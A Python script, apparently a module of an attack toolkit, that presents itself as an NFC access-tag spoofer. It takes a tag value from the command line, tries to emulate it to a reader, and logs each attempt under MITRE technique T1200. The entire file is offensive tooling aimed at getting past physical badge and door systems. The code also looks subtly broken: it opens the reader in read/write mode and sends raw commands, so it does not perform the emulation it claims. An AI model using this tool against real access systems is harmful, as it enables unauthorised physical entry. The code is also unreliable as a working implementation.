#!/usr/bin/env python3
# modules/attacks/nfc_access_spoofer.py

import argparse
import nfc
import json
import os
from datetime import datetime

LOG_FILE = "results/nfc_spoofer_log.json"
MITRE_TTP = "T1200"

def log_emulation(tag_data):
    os.makedirs("results", exist_ok=True)
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps({
            "timestamp": datetime.utcnow().isoformat(),
            "spoofed_data": tag_data,
            "ttp": MITRE_TTP
        }) + "\n")

class TagEmulator:
    def __init__(self, payload):
        self.payload = payload.encode()

    def on_startup(self, target):
        return True

    def on_connect(self, tag):
        tag.send_cmd(self.payload)
        print(f"[✓] Emulated NFC tag with data: {self.payload.hex()}")
        log_emulation(self.payload.hex())
        return True

    def on_release(self, tag):
        return

def emulate_nfc_tag(tag_content):
    clf = nfc.ContactlessFrontend('usb')
    try:
        clf.connect(llcp={'on-startup': lambda target: True}, terminate=lambda: False)
        clf.connect(rdwr={
            'on-connect': TagEmulator(tag_content).on_connect
        })
    except Exception as e:
        print(f"[!] Emulation failed: {e}")
    finally:
        clf.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Spoof or emulate NFC access tags")
    parser.add_argument("--tag", required=True, help="Hex or string content to emulate")
    args = parser.parse_args()

    emulate_nfc_tag(args.tag)
